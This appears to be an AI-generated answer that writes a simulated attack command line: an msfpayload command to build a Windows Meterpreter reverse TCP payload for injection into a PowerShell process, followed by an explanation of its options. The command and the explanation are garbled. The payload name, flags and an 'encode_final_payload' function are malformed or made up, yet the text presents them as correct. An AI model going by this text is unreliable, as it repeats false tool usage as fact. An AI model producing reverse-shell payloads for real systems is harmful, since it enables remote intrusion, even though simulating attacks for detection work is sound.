Based on the documentation, I will generate realistic command lines to simulate the attack behavior.

**Attack Description:** Remotely injected into an existing 32-bit or newly created 32-bit PowerShell process, injecting shellcode as a regular Metasploit downloader shellcode.

**Command Line:**
```bash
Command: `msfpayload -p windows/meterpreter/reverse_tcp_lport=<lport> -e base64 -i encode_final_payload`
```
This command uses the `msfpayload` tool to generate a payload for a 32-bit Windows platform. The `windows/meterpreter/reverse_tcp_lport=<lport>` option specifies the payload type and listens on a specific port `<lport>`. The `-e base64` option encodes the payload using Base64, and the `-i encode_final_payload` option uses the `encode_final_payload` function to finalize the encoded payload.

**Note:** Replace `<lport>` with the desired listen port for the reverse shell connection.
